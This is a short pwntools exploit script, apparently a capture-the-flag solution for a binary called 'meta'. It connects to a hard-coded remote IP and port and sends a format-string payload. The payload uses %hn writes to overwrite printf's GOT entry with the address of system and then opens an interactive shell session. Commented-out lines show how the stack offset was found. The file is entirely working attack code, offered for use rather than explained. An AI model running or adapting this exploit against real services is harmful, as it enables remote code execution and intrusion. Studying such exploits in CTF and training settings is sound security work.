from pwn import *

HOST = "159.203.38.169"
PORT = 5685

#context.log_level = "debug"
conn = remote(HOST, PORT)
#conn = process("./meta")
#for i in range(1,1000):
#    conn.sendlineafter("How many times have you seen the meta?", "AAAA%%%d$x" % i)
#    conn.recvuntil("Your answer was: \n")
#    print(i)
#    print(conn.recvuntil("\n")[4:-1])
#offset 6
#s reloc.printf_16 
#[0x0804a010]>
payload = p32(0x0804a010 + 2)
payload += p32(0x0804a010)
#0x080483e0    1 6            sym.imp.system
payload += "%%%dx" % (0x0804 - len(payload))
payload += "%6$hn"
payload += "%%%dx" % (0x83e0 - 0x0804)
payload += "%7$hn"
conn.sendlineafter("How many times have you seen the meta?", payload)
conn.interactive()

